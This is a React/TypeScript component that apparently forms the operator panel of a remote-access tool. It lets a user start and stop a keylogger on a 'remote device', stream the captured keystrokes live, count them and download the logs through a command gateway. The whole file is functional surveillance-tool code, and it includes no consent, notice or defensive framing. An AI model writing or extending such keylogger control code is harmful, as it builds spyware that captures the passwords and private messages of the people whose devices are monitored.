import { Download, Trash2 } from 'lucide-react';
import { motion } from 'motion/react';
import { useEffect, useRef, useState } from 'react';
import { useGateway } from '../../services';
import { HelpButton } from '../HelpButton';
import { Button } from '../ui/button';

interface KeyloggerProps {
  backendId: string;
}

export function Keylogger({ backendId }: KeyloggerProps) {
  const { activeClient, sendCommand } = useGateway();
  const keylogContainerRef = useRef<HTMLDivElement>(null);

  // Local keylogs for frontend-only clearing
  const [localKeylogs, setLocalKeylogs] = useState<Array<{text: string, timestamp: number}>>([]);

  // Get real state from backend
  const backendState = activeClient?.state.keylogger || 'idle';
  const serverKeylogs = activeClient?.keylogs || [];

  // Optimistic local state - can override backend state for immediate UI feedback
  const [localActive, setLocalActive] = useState<boolean | null>(null);
  // If localActive is explicitly set (not null), use it; otherwise use backend state
  const isActive = localActive !== null ? localActive : backendState === 'active';

  // Sync local keylogs with server keylogs (append new ones)
  useEffect(() => {
    if (serverKeylogs.length > localKeylogs.length) {
      setLocalKeylogs(serverKeylogs);
    }
  }, [serverKeylogs]);

  // Sync local state with backend state - reset localActive when backend confirms
  useEffect(() => {
    // When backend state changes, let it take over from optimistic state
    if (backendState === 'active' || backendState === 'idle') {
      setLocalActive(null); // Reset to let backend state control
    }
  }, [backendState]);

  // Auto-scroll keylogs
  useEffect(() => {
    if (keylogContainerRef.current) {
      keylogContainerRef.current.scrollTop = keylogContainerRef.current.scrollHeight;
    }
  }, [localKeylogs]);

  const handleStart = () => {
    setLocalActive(true); // Immediate UI feedback
    sendCommand('start_keylog');
  };

  const handleStop = () => {
    setLocalActive(false); // Immediate UI feedback
    sendCommand('stop_keylog');
  };

  const handleClearLocal = () => {
    // Frontend-only clear - logs are still kept on backend
    setLocalKeylogs([]);
  };

  const handleDownloadLogs = () => {
    // Request log file from backend
    sendCommand('download_keylogs');
  };

  return (
    <div className="h-full flex flex-col p-6">
      <div className="flex items-center justify-between mb-6">
        <div className="flex items-center gap-3">
          <h3 className="text-2xl">Keylogger</h3>
          <HelpButton
            title="Keylogger"
            description="Capture keystrokes from the remote device in real-time."
            instructions={[
              'Click "Start Keylogger" to begin capturing',
              'Keystrokes appear in the terminal below',
              'Click "Stop Keylogger" to end the session',
            ]}
          />
        </div>
        {isActive && (
          <div className="flex gap-2">
            <Button variant="outline" size="sm" onClick={handleDownloadLogs}>
              <Download className="w-4 h-4 mr-2" /> Download Logs
            </Button>
            {localKeylogs.length > 0 && (
              <Button variant="outline" size="sm" onClick={handleClearLocal}>
                <Trash2 className="w-4 h-4 mr-2" /> Clear Display
              </Button>
            )}
          </div>
        )}
      </div>

      {!isActive ? (
        <div className="flex-1 bg-gray-50 rounded-xl flex items-center justify-center">
          <motion.div
            initial={{ opacity: 0, scale: 0.95 }}
            animate={{ opacity: 1, scale: 1 }}
            className="text-center max-w-md"
          >
            <div className="w-20 h-20 bg-black rounded-2xl flex items-center justify-center mx-auto mb-6">
              <svg width="40" height="40" viewBox="0 0 24 24" fill="none">
                <rect x="3" y="6" width="18" height="12" rx="2" stroke="white" strokeWidth="2"/>
                <path d="M7 10H7.01M11 10H11.01M15 10H15.01M7 14H17" stroke="white" strokeWidth="2" strokeLinecap="round"/>
              </svg>
            </div>
            <h4 className="text-xl mb-3">Keylogger</h4>
            <p className="text-gray-600 mb-6">
              Capture keystrokes from the remote device in real-time
            </p>
            <Button
              onClick={handleStart}
              className="bg-black hover:bg-gray-800 text-white"
            >
              Start Keylogger
            </Button>
          </motion.div>
        </div>
      ) : (
        <div className="flex-1 flex flex-col gap-4">
          {/* Keylog Display - Notepad style (horizontal typing) */}
          <div
            ref={keylogContainerRef}
            className="flex-1 bg-gray-900 rounded-xl overflow-hidden p-4 font-mono text-sm text-green-400 overflow-y-auto whitespace-pre-wrap break-words"
          >
            {localKeylogs.length === 0 ? (
              <motion.div
                animate={{ opacity: [0.4, 1, 0.4] }}
                transition={{ duration: 2, repeat: Infinity }}
                className="text-gray-500"
              >
                Waiting for keystrokes...
              </motion.div>
            ) : (
              <div className="leading-relaxed">
                {localKeylogs.map((log, idx) => {
                  // Handle special characters for display
                  const text = log.text;

                  // Newline - render as actual line break
                  if (text === '\n' || text === '\\n') {
                    return <br key={idx} />;
                  }

                  // Tab - render as spaces
                  if (text === '\t' || text === '\\t') {
                    return <span key={idx} className="text-gray-600">{'    '}</span>;
                  }

                  // Backspace - show as special marker
                  if (text === '[Backspace]') {
                    return <span key={idx} className="text-red-400 text-xs">⌫</span>;
                  }

                  // Other special keys in brackets - show smaller
                  if (text.startsWith('[') && text.endsWith(']')) {
                    return <span key={idx} className="text-yellow-400 text-xs mx-0.5">{text}</span>;
                  }

                  // Regular characters - just show inline
                  return <span key={idx}>{text}</span>;
                })}
                <motion.span
                  animate={{ opacity: [1, 0, 1] }}
                  transition={{ duration: 1, repeat: Infinity }}
                  className="inline-block w-2 h-4 bg-green-400 ml-0.5 align-middle"
                />
              </div>
            )}
          </div>

          {/* Status Bar */}
          <div className="bg-black/70 backdrop-blur-sm text-white px-4 py-3 rounded-xl flex items-center justify-between">
            <div className="flex items-center gap-3">
              <div className="flex items-center gap-2">
                <div className="w-2 h-2 bg-green-500 rounded-full animate-pulse" />
                <span className="text-sm">Keylogger Active</span>
              </div>
              <span className="text-sm text-gray-400">• {localKeylogs.length} keystrokes</span>
            </div>
            <Button
              onClick={handleStop}
              variant="outline"
              size="sm"
              className="border-red-400 text-red-400 hover:bg-red-400/20"
            >
              Stop Keylogger
            </Button>
          </div>
        </div>
      )}
    </div>
  );
}
